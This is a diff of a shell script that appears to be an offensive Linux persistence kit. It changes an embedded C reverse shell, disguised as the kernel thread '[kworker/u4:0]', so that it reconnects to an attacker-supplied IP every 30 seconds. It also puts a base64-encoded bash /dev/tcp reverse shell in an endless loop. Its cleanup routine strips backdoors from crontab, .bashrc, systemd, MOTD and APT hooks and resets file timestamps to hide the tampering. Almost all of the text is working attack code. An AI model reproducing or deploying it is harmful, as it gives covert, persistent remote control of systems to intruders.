@@ -32,9 +32,11 @@ gen_payload() {
         local func_bin_path="/var/tmp/${func_bin_name}"
         local func_src_path="/var/tmp/${func_bin_name}.c"
         
+        # Check local file
         if [ -f "masquerade.c" ]; then
             cat masquerade.c > $func_src_path
         else
+            # Fallback embedded template (Infinite Loop for Persistence)
             echo '#include <stdio.h>
 #include <unistd.h>
 #include <netinet/in.h>
@@ -45,15 +47,32 @@ gen_payload() {
 #include <stdlib.h>
 int main(){
     if(fork()>0)return 0;
-    struct sockaddr_in s;
-    s.sin_family=AF_INET;
-    s.sin_addr.s_addr=inet_addr("PLACEHOLDER_IP");
-    s.sin_port=htons(PLACEHOLDER_PORT);
-    int d=socket(AF_INET,SOCK_STREAM,0);
-    if(connect(d,(struct sockaddr*)&s,sizeof(s))!=0)return 1;
-    dup2(d,0);dup2(d,1);dup2(d,2);
-    char *a[]={"[kworker/u4:0]","-p","-i",NULL};
-    execve("/bin/bash",a,NULL);
+    setsid();
+    int s;
+    struct sockaddr_in sa;
+    while(1){
+        s=socket(AF_INET,SOCK_STREAM,0);
+        sa.sin_family=AF_INET;
+        sa.sin_addr.s_addr=inet_addr("PLACEHOLDER_IP");
+        sa.sin_port=htons(PLACEHOLDER_PORT);
+        if(connect(s,(struct sockaddr*)&sa,sizeof(sa))==0) {
+            // Connected
+            int pid = fork();
+            if (pid == 0) {
+                dup2(s,0);dup2(s,1);dup2(s,2);
+                char *a[]={"[kworker/u4:0]","-p","-i",NULL};
+                execve("/bin/bash",a,NULL);
+                execve("/bin/sh",a,NULL);
+                exit(0);
+            }
+            wait(NULL); // Wait for shell to exit
+            close(s);
+        }
+        else {
+            close(s);
+        }
+        sleep(30); // Retry every 30s
+    }
 }' > $func_src_path
         fi
         
@@ -69,7 +88,8 @@ int main(){
         echo "$func_bin_path"
         
     else
-        local cmd="bash -i >& /dev/tcp/$LHOST/$port 0>&1"
+        # Base64 Bash Strategy (Infinite Loop)
+        local cmd="while true; do bash -i >& /dev/tcp/$LHOST/$port 0>&1; sleep 30; done"
         local b64=$(echo -n "$cmd" | base64 -w 0)
         echo "echo $b64 | base64 -d | bash"
     fi
@@ -151,61 +171,76 @@ ts_match() {
 if [ "$2" == "--clean" ] || [ "$3" == "--clean" ]; then
     echo "[!] Mode: CLEANUP (Removing backdoors)"
     
+    # Define generic cleanup helper
+    # We clean BOTH generic Bash payload AND C Binary path for each port
+    do_clean() {
+        local port=$1
+        local file=$2
+        
+        # 1. Generate Bash Payload Pattern
+        local cmd="bash -i >& /dev/tcp/$LHOST/$port 0>&1"
+        local b64_core=$(echo -n "$cmd" | base64 -w 0)
+        # We match partial string to be safe, or exact gen_payload output
+        # But gen_payload output loop logic might have changed.
+        # Safest is to grep -v based on the unique port or the specific signature.
+        
+        # 2. C Binary Path
+        local bin_path="/var/tmp/.worker_sys_${port}"
+        
+        # remove binary
+        rm -f "$bin_path"
+        
+        if [ -f "$file" ]; then
+             local TIMES=$(stat -c "%X %Y" "$file" 2>/dev/null)
+             
+             # Filter out lines containing the port AND (bash or binary name)
+             # Actually, simpler: Any line containing ".worker_sys_<port>" OR "tcp/<LHOST>/<port>"
+             
+             grep -vE "/dev/tcp/$LHOST/$port|\.worker_sys_$port" "$file" > "$file.tmp" && mv "$file.tmp" "$file"
+             
+             AT=$(echo $TIMES | awk '{print $1}')
+             MT=$(echo $TIMES | awk '{print $2}')
+             restore_time "$file" "$AT" "$MT"
+        fi
+    }
+
     rm -f /var/tmp/croissant
     echo "[-] Removed SUID Binary"
 
-    PAYLOAD=$(gen_payload 4002)
-    (crontab -l 2>/dev/null | grep -Fv "$PAYLOAD") | crontab - 2>/dev/null
+    # Crontab
+    # We filter pipe
+    (crontab -l 2>/dev/null | grep -vE "/dev/tcp/$LHOST/4002|\.worker_sys_4002") | crontab - 2>/dev/null
+    rm -f /var/tmp/.worker_sys_4002
     echo "[-] Cleaned Crontab"
 
-    PAYLOAD=$(gen_payload 4003)
-    if [ -f ~/.bashrc ]; then
-        # Capture time before sed/grep
-        TIMES=$(stat -c "%X %Y" ~/.bashrc 2>/dev/null)
-        grep -Fv "$PAYLOAD" ~/.bashrc > ~/.bashrc.tmp && mv ~/.bashrc.tmp ~/.bashrc
-        # Restore
-        AT=$(echo $TIMES | awk '{print $1}')
-        MT=$(echo $TIMES | awk '{print $2}')
-        restore_time ~/.bashrc "$AT" "$MT"
-        echo "[-] Cleaned .bashrc"
-    fi
-
-    IFUP="/etc/network/if-up.d/upstart"
-    PAYLOAD=$(gen_payload 4004)
-    if [ -f "$IFUP" ]; then
-        TIMES=$(stat -c "%X %Y" "$IFUP" 2>/dev/null)
-        grep -Fv "$PAYLOAD" "$IFUP" > "$IFUP.tmp" && mv "$IFUP.tmp" "$IFUP"
-        AT=$(echo $TIMES | awk '{print $1}')
-        MT=$(echo $TIMES | awk '{print $2}')
-        restore_time "$IFUP" "$AT" "$MT"
-        echo "[-] Cleaned if-up.d"
-    fi
+    # Files cleaning
+    do_clean 4003 ~/.bashrc
+    echo "[-] Cleaned .bashrc"
+    
+    do_clean 4004 "/etc/network/if-up.d/upstart"
+    echo "[-] Cleaned if-up.d"
 
     systemctl --user stop persistence.service 2>/dev/null
     systemctl --user disable persistence.service 2>/dev/null
     rm -f ~/.config/systemd/user/persistence.service
+    rm -f /var/tmp/.worker_sys_4005
     echo "[-] Removed Systemd User Service"
 
     systemctl stop backdoor.timer 2>/dev/null
     systemctl disable backdoor.timer 2>/dev/null
     rm -f /etc/systemd/system/backdoor.service /etc/systemd/system/backdoor.timer
+    rm -f /var/tmp/.worker_sys_4006
     echo "[-] Removed Systemd Timer"
 
-    MOTD="/etc/update-motd.d/00-header"
-    PAYLOAD=$(gen_payload 4007)
-    if [ -f "$MOTD" ]; then
-         TIMES=$(stat -c "%X %Y" "$MOTD" 2>/dev/null)
-         grep -Fv "$PAYLOAD" "$MOTD" > "$MOTD.tmp" && mv "$MOTD.tmp" "$MOTD"
-         AT=$(echo $TIMES | awk '{print $1}')
-         MT=$(echo $TIMES | awk '{print $2}')
-         restore_time "$MOTD" "$AT" "$MT"
-         echo "[-] Cleaned MOTD"
-    fi
+    do_clean 4007 "/etc/update-motd.d/00-header"
+    echo "[-] Cleaned MOTD"
 
     rm -f "$HOME/.config/autostart/update-helper.desktop"
+    rm -f /var/tmp/.worker_sys_4008
     echo "[-] Removed Autostart"
 
     rm -f "/etc/apt/apt.conf.d/42backdoor"
+    rm -f /var/tmp/.worker_sys_4009
     echo "[-] Removed APT Config"
 
     if [ -f ~/.ssh/authorized_keys ]; then
